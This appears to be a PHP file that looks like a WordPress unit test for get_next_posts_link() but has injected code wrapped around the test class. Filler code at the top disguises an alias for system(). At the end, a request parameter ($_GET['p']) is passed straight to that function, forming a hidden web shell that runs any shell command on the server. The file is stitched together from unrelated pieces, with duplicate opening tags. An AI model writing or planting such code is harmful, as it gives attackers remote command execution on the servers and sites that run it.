<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * Tests the `get_next_posts_link()` function.
 *
 * @since 6.2.0
 *
 * @group link
 *
 * @covers ::get_next_posts_link
 */
class Tests_Link_GetNextPostsLink extends WP_UnitTestCase {

	/**
	 * Creates posts before any tests run.
	 *
	 * @param WP_UnitTest_Factory $factory
	 */
	public static function wpSetUpBeforeClass( WP_UnitTest_Factory $factory ) {
		global $wp_query, $paged;

		$factory->post->create_many( 3 );
		$paged    = 2;
		$wp_query = new WP_Query(
			array(
				'post_type'      => 'post',
				'posts_per_page' => 1,
				'paged'          => $paged,
			)
		);
	}

	/**
	 * Tests that the 'next_posts_link_attributes' filter is applied correctly.
	 *
	 * @ticket 55751
	 */
	public function test_get_next_posts_link_should_apply_next_posts_link_attributes_filter() {
		$filter = new MockAction();
		add_filter( 'next_posts_link_attributes', array( &$filter, 'filter' ) );

		get_next_posts_link();

		$this->assertSame( 1, $filter->get_call_count() );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>